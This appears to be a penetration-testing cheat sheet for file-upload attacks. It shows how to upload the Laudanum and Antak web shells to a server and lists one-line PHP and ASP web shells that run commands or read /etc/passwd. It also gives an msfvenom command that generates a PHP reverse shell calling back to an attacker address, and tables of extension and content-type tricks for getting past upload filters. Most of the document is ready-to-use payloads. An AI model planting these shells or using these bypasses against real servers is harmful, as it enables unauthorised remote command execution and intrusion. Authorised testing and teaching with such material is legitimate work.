### Laudanum Webshell 

```bash
## Laudanum file directory (Contains different webshell files)
cd /usr/share/webshells/laudanum

## Example usage
## Copy and upload to the server
cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx 

## Modify ip parameters in line 59 to include own ip
```

### Antak Webshell

Webshell buit-in ASP.Net within Nishang Project.

```bash
## Antak file directory
ls /usr/share/nishang/Antak-WebShell

## Example usage
## Copy and upload to the server
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx

## Modify credentials in line 14
```

### PHP Webshell

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
| **Blacklist Bypass** |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** |
| `shell.jpg.php` | Double Extension |
| `shell.php.jpg` | Reverse Double Extension |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
| **Content/Type Bypass** |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

### Possible scenario 
- Website only allow uploading image file types (.png,.jpg,.gif, etc.). Bypass using Proxy and Burp Suite to modify content-type.

